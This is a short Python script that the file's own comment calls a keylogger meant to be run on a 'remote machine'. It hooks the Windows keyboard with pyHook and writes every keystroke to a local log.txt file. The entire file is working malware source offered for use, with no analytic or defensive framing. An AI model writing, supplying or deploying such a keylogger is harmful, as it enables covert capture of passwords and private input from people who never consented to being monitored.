import pyHook,pythoncom,sys,logging
file_log='log.txt'

#This is a keylogger python file once ran into remote machine it will record all the inputs coming form keyboard in notepad
def onkeypress(event):
    logging.basicConfig(filename=file_log,level=logging.DEBUG,format='%(message)s')
    chr(event.Ascii)
    logging.log(10,chr(event.Ascii))
    return True
hook_manager=pyHook.HookManager()
hook_manager.KeyDown=onkeypress
hook_manager.HookKeyboard()
pythoncom.PumpMessages()
